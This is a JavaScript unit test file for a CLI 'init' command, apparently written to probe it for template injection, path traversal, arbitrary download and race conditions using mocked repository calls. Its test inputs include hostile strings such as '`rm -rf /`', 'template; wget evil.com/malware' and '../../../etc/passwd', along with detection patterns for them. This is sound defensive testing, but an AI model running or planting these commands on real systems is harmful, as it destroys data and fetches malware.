/**
 * Unit tests for init command
 * Tests template injection, path traversal, and security vulnerabilities
 */

import { test, expect, describe, beforeEach, afterEach } from 'bun:test';
import { init } from '../../../src/cli/init.js';
import { makeTempProjectFromStructure } from '../../helpers/temp-project.js';
import fs from 'fs/promises';
import path from 'path';

const cleanupTasks = [];

afterEach(async () => {
  for (const cleanup of cleanupTasks) {
    await cleanup();
  }
  cleanupTasks.length = 0;
});

describe('Init Command', () => {
  describe('V5: Template Security Vulnerabilities (MEDIUM SECURITY PRIORITY)', () => {
    test('should expose template injection in repository path construction (line 46)', async () => {
      const project = await makeTempProjectFromStructure({});
      cleanupTasks.push(project.cleanup);
      
      // Track repository service calls
      const repositoryRequests = [];
      
      // Mock repository service to capture injection attempts
      const { RepositoryService } = await import('../../../src/utils/repository-service.js');
      const originalExists = RepositoryService.prototype.repositoryExists;
      const originalDownload = RepositoryService.prototype.downloadAndExtract;
      
      RepositoryService.prototype.repositoryExists = async function(org, repo) {
        repositoryRequests.push({ action: 'exists', org, repo });
        
        // VULNERABILITY DOCUMENTED: Template injection in repo path
        if (repo.includes('../') || repo.includes('..\\') || repo.includes('%2e%2e')) {
          console.warn(`[SECURITY] Path traversal in repository name: ${repo}`);
        }
        
        if (repo.includes('${') || repo.includes('`') || repo.includes('eval(')) {
          console.warn(`[SECURITY] Template injection attempt: ${repo}`);
        }
        
        // Return false to prevent actual download
        return false;
      };
      
      RepositoryService.prototype.downloadAndExtract = async function(org, repo, dir, logger) {
        repositoryRequests.push({ action: 'download', org, repo, dir });
        throw new Error('Download blocked for security test');
      };
      
      // Test malicious template injection patterns
      const maliciousTemplates = [
        '../../../etc/passwd',              // Path traversal
        '..\\..\\..\\Windows\\System32',    // Windows path traversal
        '${process.env.HOME}',              // Template injection
        '`rm -rf /`',                       // Command injection
        'eval(malicious_code)',             // Code injection
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f',     // URL encoded path traversal
        'template; wget evil.com/malware',  // Command chaining
        'template</script><script>alert(1)</script>' // XSS-style injection
      ];
      
      try {
        for (const maliciousTemplate of maliciousTemplates) {
          const args = { template: maliciousTemplate };
          
          // Save current directory and change to test project
          const originalCwd = process.cwd();
          process.chdir(project.sourceDir);
          
          try {
            await init(args);
            // Should not reach here due to repository not existing
          } catch (error) {
            // Expected - repository doesn't exist or download blocked
          } finally {
            process.chdir(originalCwd);
          }
        }
        
        // TEMPLATE INJECTION DOCUMENTED: Check for malicious requests
        const dangerousRequests = repositoryRequests.filter(req => 
          req.repo.includes('../') || 
          req.repo.includes('..\\') ||
          req.repo.includes('${') ||
          req.repo.includes('`') ||
          req.repo.includes('eval(') ||
          req.repo.includes('%2e%2e')
        );
        
        if (dangerousRequests.length > 0) {
          console.warn(`[SECURITY] Template injection vulnerabilities: ${dangerousRequests.length} dangerous requests`);
          dangerousRequests.forEach(req => {
            console.warn(`[SECURITY] Dangerous repo path: ${req.repo}`);
          });
        }
        
        expect(repositoryRequests.length).toBeGreaterThan(0);
        
      } finally {
        // Restore original methods
        RepositoryService.prototype.repositoryExists = originalExists;
        RepositoryService.prototype.downloadAndExtract = originalDownload;
      }
    });

    test('should expose directory traversal in current directory operations (line 28)', async () => {
      const project = await makeTempProjectFromStructure({
        'legitimate-file.txt': 'Safe content'
      });
      cleanupTasks.push(project.cleanup);
      
      // Track file system access attempts
      const fsAccess = [];
      const originalReaddir = fs.readdir;
      const originalCwd = process.cwd;
      
      fs.readdir = async (dirPath, options) => {
        fsAccess.push({ action: 'readdir', path: dirPath });
        return originalReaddir(dirPath, options);
      };
      
      // Mock process.cwd to return potentially dangerous paths
      const maliciousPaths = [
        '/etc',                    // System directory
        '/root',                   // Root home directory
        '/../../../etc',           // Path traversal
        'C:\\Windows\\System32',   // Windows system directory
        '/proc/self',              // Process information
        '/var/log',                // System logs
      ];
      
      try {
        for (const dangerousPath of maliciousPaths) {
          // Temporarily mock process.cwd
          process.cwd = () => dangerousPath;
          
          const args = { template: 'safe-template' };
          
          try {
            await init(args);
          } catch (error) {
            // Expected - various errors due to dangerous paths
          }
        }
        
        // DIRECTORY TRAVERSAL DOCUMENTED: Check for dangerous access
        const systemAccess = fsAccess.filter(access => 
          access.path.includes('/etc') ||
          access.path.includes('/root') ||
          access.path.includes('/proc') ||
          access.path.includes('/var/log') ||
          access.path.includes('C:\\Windows') ||
          access.path.includes('System32')
        );
        
        if (systemAccess.length > 0) {
          console.warn(`[SECURITY] Directory traversal risk: ${systemAccess.length} system directory accesses`);
          systemAccess.forEach(access => {
            console.warn(`[SECURITY] System path accessed: ${access.path}`);
          });
        }
        
        expect(fsAccess.length).toBeGreaterThan(0);
        
      } finally {
        // Restore original functions
        fs.readdir = originalReaddir;
        process.cwd = originalCwd;
      }
    });

    test('should expose arbitrary file download vulnerability (line 84)', async () => {
      const project = await makeTempProjectFromStructure({});
      cleanupTasks.push(project.cleanup);
      
      // Track download attempts to malicious repositories
      const downloadAttempts = [];
      
      const { RepositoryService } = await import('../../../src/utils/repository-service.js');
      const originalExists = RepositoryService.prototype.repositoryExists;
      const originalDownload = RepositoryService.prototype.downloadAndExtract;
      
      RepositoryService.prototype.repositoryExists = async function(org, repo) {
        // Always return true to trigger download attempt
        return true;
      };
      
      RepositoryService.prototype.downloadAndExtract = async function(org, repo, dir, logger) {
        downloadAttempts.push({ org, repo, dir });
        
        // ARBITRARY DOWNLOAD DOCUMENTED: Check for malicious repositories
        if (repo.includes('malware') || repo.includes('exploit') || repo.includes('payload')) {
          console.warn(`[SECURITY] Malicious repository download attempt: ${org}/${repo}`);
        }
        
        if (org.includes('attacker') || org.includes('evil') || org.includes('hack')) {
          console.warn(`[SECURITY] Suspicious organization: ${org}`);
        }
        
        // Check for attempts to download to dangerous locations
        if (dir.includes('/etc') || dir.includes('/root') || dir.includes('C:\\Windows')) {
          console.warn(`[SECURITY] Download to dangerous location: ${dir}`);
        }
        
        // Simulate successful download (don't actually download)
        logger.info(`Mock download: ${org}/${repo} to ${dir}`);
      };
      
      // Test potentially malicious repository downloads
      const maliciousScenarios = [
        { template: 'malware-payload', org: 'attacker', expectedRepo: 'unify-starter-malware-payload' },
        { template: 'exploit-kit', org: 'evil-corp', expectedRepo: 'unify-starter-exploit-kit' },
        { template: 'backdoor', org: 'hacker-group', expectedRepo: 'unify-starter-backdoor' }
      ];
      
      try {
        const originalCwd = process.cwd();
        process.chdir(project.sourceDir);
        
        for (const scenario of maliciousScenarios) {
          const args = { template: scenario.template };
          
          try {
            await init(args);
          } catch (error) {
            // May fail for various reasons, focus on security documentation
          }
        }
        
        process.chdir(originalCwd);
        
        // ARBITRARY DOWNLOAD DOCUMENTED: Analyze download attempts
        if (downloadAttempts.length > 0) {
          console.warn(`[SECURITY] Arbitrary file download vulnerability: ${downloadAttempts.length} download attempts`);
          
          downloadAttempts.forEach(attempt => {
            console.warn(`[SECURITY] Download attempt: ${attempt.org}/${attempt.repo} to ${attempt.dir}`);
          });
        }
        
        expect(downloadAttempts.length).toBeGreaterThan(0);
        
      } finally {
        // Restore original methods
        RepositoryService.prototype.repositoryExists = originalExists;
        RepositoryService.prototype.downloadAndExtract = originalDownload;
      }
    });

    test('should expose template validation bypass with encoded characters', async () => {
      const project = await makeTempProjectFromStructure({});
      cleanupTasks.push(project.cleanup);
      
      // Track validation bypasses
      const validationTests = [];
      
      const { RepositoryService } = await import('../../../src/utils/repository-service.js');
      const originalExists = RepositoryService.prototype.repositoryExists;
      
      RepositoryService.prototype.repositoryExists = async function(org, repo) {
        validationTests.push({ org, repo });
        
        // VALIDATION BYPASS DOCUMENTED: Check for encoding attacks
        const decodedRepo = decodeURIComponent(repo);
        if (decodedRepo !== repo) {
          console.warn(`[SECURITY] URL encoded template bypass: ${repo} -> ${decodedRepo}`);
        }
        
        // Check for double encoding
        try {
          const doubleDecoded = decodeURIComponent(decodedRepo);
          if (doubleDecoded !== decodedRepo) {
            console.warn(`[SECURITY] Double encoding detected: ${repo} -> ${doubleDecoded}`);
          }
        } catch (e) {
          // Invalid encoding
        }
        
        // Check for Unicode normalization attacks
        if (repo.includes('\\u') || repo.includes('\\x')) {
          console.warn(`[SECURITY] Unicode escape sequence in template: ${repo}`);
        }
        
        return false; // Don't actually download
      };
      
      // Test encoding-based validation bypasses
      const encodedAttacks = [
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f',     // URL encoded ../../../
        '%252e%252e%252f',                  // Double URL encoded ../
        '..%252f..%252f..%252f',           // Mixed encoding
        '\\u002e\\u002e\\u002f',           // Unicode escaped ../
        '\\x2e\\x2e\\x2f',                 // Hex escaped ../
        encodeURIComponent('../../../'),    // Legitimate encoding of dangerous path
        '..%c0%af..%c0%af..%c0%af',        // UTF-8 overlong encoding
        '..\\u002e.\\u002e.'               // Mixed unicode and normal
      ];
      
      try {
        const originalCwd = process.cwd();
        process.chdir(project.sourceDir);
        
        for (const encodedAttack of encodedAttacks) {
          const args = { template: encodedAttack };
          
          try {
            await init(args);
          } catch (error) {
            // Expected - repositories don't exist
          }
        }
        
        process.chdir(originalCwd);
        
        // ENCODING BYPASS DOCUMENTED: Check for bypass attempts
        const bypassAttempts = validationTests.filter(test => {
          const decoded = decodeURIComponent(test.repo);
          return decoded !== test.repo || 
                 test.repo.includes('%') || 
                 test.repo.includes('\\u') || 
                 test.repo.includes('\\x');
        });
        
        if (bypassAttempts.length > 0) {
          console.warn(`[SECURITY] Template validation bypass attempts: ${bypassAttempts.length} encoded attacks`);
        }
        
        expect(validationTests.length).toBeGreaterThan(0);
        
      } finally {
        RepositoryService.prototype.repositoryExists = originalExists;
      }
    });

    test('should expose race condition in directory check and initialization (lines 35-38)', async () => {
      const project = await makeTempProjectFromStructure({
        'existing-file.txt': 'Existing content'
      });
      cleanupTasks.push(project.cleanup);
      
      // Track timing of directory operations
      const operationTimings = [];
      
      const originalReaddir = fs.readdir;
      fs.readdir = async (dirPath, options) => {
        const startTime = Date.now();
        const result = await originalReaddir(dirPath, options);
        operationTimings.push({
          action: 'readdir',
          path: dirPath,
          startTime,
          endTime: Date.now(),
          fileCount: result.length
        });
        return result;
      };
      
      const { RepositoryService } = await import('../../../src/utils/repository-service.js');
      const originalDownload = RepositoryService.prototype.downloadAndExtract;
      
      RepositoryService.prototype.downloadAndExtract = async function(org, repo, dir, logger) {
        operationTimings.push({
          action: 'download',
          org,
          repo,
          dir,
          startTime: Date.now(),
          endTime: Date.now() + 100  // Simulate download time
        });
        
        // Simulate race condition by modifying directory during download
        await fs.writeFile(path.join(dir, 'race-condition-file.txt'), 'Added during download');
        
        logger.info(`Simulated download with race condition`);
      };
      
      try {
        const originalCwd = process.cwd();
        process.chdir(project.sourceDir);
        
        // Run multiple concurrent init operations to trigger race conditions
        const concurrentOps = [];
        for (let i = 0; i < 3; i++) {
          concurrentOps.push(
            init({ template: `race-test-${i}` }).catch(error => {
              // Expected to fail, focus on race condition detection
              return { error: error.message };
            })
          );
        }
        
        await Promise.allSettled(concurrentOps);
        
        process.chdir(originalCwd);
        
        // RACE CONDITION DOCUMENTED: Analyze timing patterns
        const readdirOps = operationTimings.filter(op => op.action === 'readdir');
        const downloadOps = operationTimings.filter(op => op.action === 'download');
        
        if (readdirOps.length > 1) {
          // Check for overlapping directory checks
          const overlappingChecks = readdirOps.filter((op1, index) => {
            return readdirOps.some((op2, index2) => 
              index !== index2 && 
              op1.startTime < op2.endTime && 
              op2.startTime < op1.endTime
            );
          });
          
          if (overlappingChecks.length > 0) {
            console.warn(`[SECURITY] Race condition: ${overlappingChecks.length} overlapping directory checks`);
          }
        }
        
        if (downloadOps.length > 0) {
          console.warn(`[SECURITY] Concurrent initialization attempts: ${downloadOps.length} download operations`);
        }
        
        expect(operationTimings.length).toBeGreaterThan(0);
        
      } finally {
        fs.readdir = originalReaddir;
        RepositoryService.prototype.downloadAndExtract = originalDownload;
      }
    });
  });

  describe('Basic Init Command Functionality', () => {
    test('should handle empty directory check', async () => {
      const project = await makeTempProjectFromStructure({});
      cleanupTasks.push(project.cleanup);
      
      const { isDirectoryEmpty } = await import('../../../src/cli/init.js');
      
      // Test with empty directory
      const isEmpty = await isDirectoryEmpty(project.sourceDir);
      expect(isEmpty).toBe(true);
      
      // Test with non-existent directory
      const nonExistentPath = path.join(project.sourceDir, 'non-existent');
      const isNonExistentEmpty = await isDirectoryEmpty(nonExistentPath);
      expect(isNonExistentEmpty).toBe(true);
    });

    test('should detect non-empty directory', async () => {
      const project = await makeTempProjectFromStructure({
        'existing-file.txt': 'Some content'
      });
      cleanupTasks.push(project.cleanup);
      
      const { isDirectoryEmpty } = await import('../../../src/cli/init.js');
      
      const isEmpty = await isDirectoryEmpty(project.sourceDir);
      expect(isEmpty).toBe(false);
    });
  });
});